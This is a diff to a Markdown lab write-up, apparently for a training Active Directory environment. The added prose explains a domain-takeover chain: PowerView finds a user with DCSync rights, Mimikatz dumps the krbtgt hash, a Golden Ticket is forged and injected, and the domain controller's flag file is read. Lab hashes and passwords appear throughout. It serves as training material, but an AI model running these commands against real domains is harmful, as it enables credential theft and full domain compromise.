@@ -274,7 +274,9 @@ NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791
 
 > Answer:Sup3rS3cur3D0m@inU2eR
 
-7- ****
+7- **What attack can this user perform?**
+
+First, I checked the Active Directory (AD) attributes of the user tpetty to determine their roles, group memberships, and account control flags:
 
 ```c
 PS C:\> Get-DomainUser -Identity tpetty  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
@@ -285,7 +287,7 @@ objectsid          : S-1-5-21-2270287766-1317258649-2146029398-4607
 memberof           :
 useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
 
-
+Next, I verified whether tpetty has replication privileges in the domain by checking Access Control Entries (ACEs) associated with their Security Identifier (SID):
 
 PS C:\> $sid= "S-1-5-21-2270287766-1317258649-2146029398-4607"
 PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
@@ -310,7 +312,12 @@ SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
 ObjectAceType         : DS-Replication-Get-Changes-All
 ```
 
+These permissions indicate that tpetty has DCSync privileges, meaning they can request and replicate Active Directory password hashes.
 
+8- **Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01**
+
+To begin, I use Mimikatz to extract the NTLM hash of the krbtgt account. This is essential for forging a Kerberos Golden Ticket.
+```c
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
 [DC] 'INLANEFREIGHT.LOCAL' will be the domain
 [DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
@@ -386,15 +393,17 @@ Supplemental Credentials:
     28  58705a0138014a18c509951e3e53babd
     29  9ffa2d0920441c7b8ea25cc4ff686f4c
 
-
-
+```
+I check the Enterprise Admins group to obtain the SID, which I need for ticket generation.
+```c
 PS C:\> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
 
 distinguishedname                                       objectsid
 -----------------                                       ---------
 CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-2270287766-1317258649-2146029398-519
-
-
+```
+Now, I generate and inject a Golden Ticket using the extracted NTLM hash and domain SID.
+```c
 mimikatz # kerberos::golden /User:johnny /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2270287766-1317258649-2146029398 /krbtgt:6dbd63f4a0e7c8b221d61f265c4a08a7 /id:500 /ptt
 User      : hacker
 Domain    : INLANEFREIGHT.LOCAL (INLANEFREIGHT)
@@ -415,9 +424,12 @@ Golden ticket for 'johnny @ INLANEFREIGHT.LOCAL' successfully submitted for curr
 
 mimikatz # exit
 Bye!
+```
+With the Golden Ticket active, I can now access sensitive files on the domain controller.
+```c
 PS C:\> type \\dc01\c$\Users\Administrator\Desktop\flag.txt
 r3plicat1on_m@st3r!
-
+```
 
 
 
